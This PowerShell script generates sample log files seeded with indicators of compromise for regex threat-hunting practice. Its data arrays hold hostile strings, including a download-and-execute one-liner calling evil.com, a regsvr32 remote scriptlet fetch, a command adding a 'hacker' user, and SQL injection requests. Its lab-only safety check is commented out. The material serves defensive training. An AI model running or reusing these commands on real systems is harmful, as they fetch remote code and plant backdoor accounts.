# Create-RegexIOCs.ps1
# Creates files with IOCs for regex-based threat hunting practice

# Safety check: Ensure script runs in a lab environment
$computerName = $env:COMPUTERNAME
<# if ($computerName -notlike "*LAB*") {
    Write-Warning "This script should only run in a lab environment (e.g., computer name with 'LAB'). Exiting."
    exit
}
#>
# Define target directory and number of files to create
$targetDir = "C:\LabFiles"
$numFiles = 5

# Ensure target directory exists
if (-not (Test-Path $targetDir)) {
    New-Item -Path $targetDir -ItemType Directory -Force
}

# Arrays of IOC-like content to simulate malicious activity
$ipAddresses = @("192.168.1.100", "10.0.0.50", "172.16.254.1", "203.0.113.5", "198.51.100.10")
$sqlInjectionAttempts = @(
    "GET /page?query=SELECT * FROM users WHERE id=1",
    "POST /login?user=admin' OR '1'='1",
    "GET /search?term=DROP TABLE users",
    "POST /data?input=UNION SELECT username, password FROM users"
)
$maliciousCommands = @(
    "powershell -ep bypass -c iex (new-object net.webclient).downloadstring('http://evil.com')",
    "cmd.exe /c net user hacker Password123! /add",
    "rundll32.exe shell32.dll,Control_RunDLL malicious.dll",
    "regsvr32 /s /u /i:http://malware.com scrobj.dll"
)

# Create files with IOC content
for ($i = 0; $i -lt $numFiles; $i++) {
    $fileName = Join-Path $targetDir "SuspiciousLog_$i.txt"
    $content = @()

    # Add random IOCs to the file content
    $content += "Log entry at $(Get-Date): Connection from $($ipAddresses | Get-Random)"
    $content += "Request: $($sqlInjectionAttempts | Get-Random)"
    $content += "Command executed: $($maliciousCommands | Get-Random)"
    $content += "Additional data: Normal activity logged here."

    # Write content to file
    $content | Out-File -FilePath $fileName -Encoding UTF8
    Write-Output "Created file: $fileName with IOCs"
}

# Verify created files
Write-Output "`nFiles created in $targetDir"
Get-ChildItem -Path $targetDir -Filter "SuspiciousLog_*.txt" | ForEach-Object {
    Write-Output " - $($_.FullName)"
}